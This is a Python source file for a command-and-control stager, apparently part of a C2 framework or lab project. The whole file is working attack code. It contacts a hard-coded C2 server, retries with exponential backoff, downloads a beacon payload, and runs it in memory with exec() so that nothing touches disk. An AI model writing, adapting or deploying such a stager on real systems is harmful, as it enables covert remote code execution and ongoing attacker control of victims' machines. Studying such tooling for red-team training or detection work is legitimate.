"""
© AngelaMos | 2026
stager.py

Lightweight client-side stager that fetches the full beacon payload
from the C2 server over HTTP, handles network disruptions with
exponential backoff, and executes the code in-memory using exec().
"""

import logging
import sys
import time
import urllib.request

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("stager")

# Configure your C2 server staging endpoint URL here
C2_STAGE_URL = "http://192.168.0.152:47431/stage"
MAX_RETRIES = 10
INITIAL_BACKOFF = 2.0
BACKOFF_FACTOR = 2.0


def fetch_and_stage() -> None:
    """
    Fetch the beacon payload from the C2 server with exponential backoff
    and execute it directly in memory without touching disk.
    """
    backoff = INITIAL_BACKOFF

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            logger.info(
                "Fetching stager payload from %s (Attempt %d/%d)",
                C2_STAGE_URL,
                attempt,
                MAX_RETRIES,
            )

            req = urllib.request.Request(
                C2_STAGE_URL,
                headers={"User-Agent": "C2-Stager-Client/1.0"},
            )

            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    payload_code = response.read().decode("utf-8")
                    logger.info(
                        "Successfully fetched payload (%d bytes). Executing in memory...",
                        len(payload_code),
                    )

                    # Execute the full beacon script directly in memory
                    exec(payload_code, globals())
                    return
                else:
                    logger.warning(
                        "Server returned unexpected status code: %d",
                        response.status,
                    )
        except Exception as e:
            logger.warning("Failed to connect to C2 staging server: %s", e)

        logger.info("Retrying in %.1f seconds...", backoff)
        time.sleep(backoff)
        backoff *= BACKOFF_FACTOR

    logger.error("Max retry attempts reached. Staging failed.")
    sys.exit(1)


if __name__ == "__main__":
    fetch_and_stage()